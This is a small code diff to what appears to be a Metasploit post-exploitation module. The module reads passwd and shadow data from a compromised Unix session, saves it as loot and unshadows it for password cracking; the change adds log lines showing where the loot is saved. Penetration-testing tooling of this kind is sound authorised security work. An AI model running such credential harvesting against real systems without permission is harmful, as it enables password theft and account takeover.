@@ -33,9 +33,10 @@ class Metasploit3 < Msf::Post
       passwd_data = getent_passwd
       shadow_data = getent_shadow
 
-      # Save in loot the passwd and shadow file
-      store_loot("unix.shadow", "text/plain", session, shadow_data, "shadow.txt", "Unix Password Shadow File")
-      store_loot("unix.passwd", "text/plain", session, passwd_data, "passwd.txt", "Unix Passwd File")
+      loot = store_loot("unix.shadow", "text/plain", session, shadow_data, "shadow.txt", "Unix Password Shadow File")
+      vprint_status("shadow saved in: #{loot.to_s}")
+      loot = store_loot("unix.passwd", "text/plain", session, passwd_data, "passwd.txt", "Unix Passwd File")
+      vprint_status("passwd saved in: #{loot.to_s}")
 
       # Unshadow the files
       john_file = unshadow(passwd_data, shadow_data)
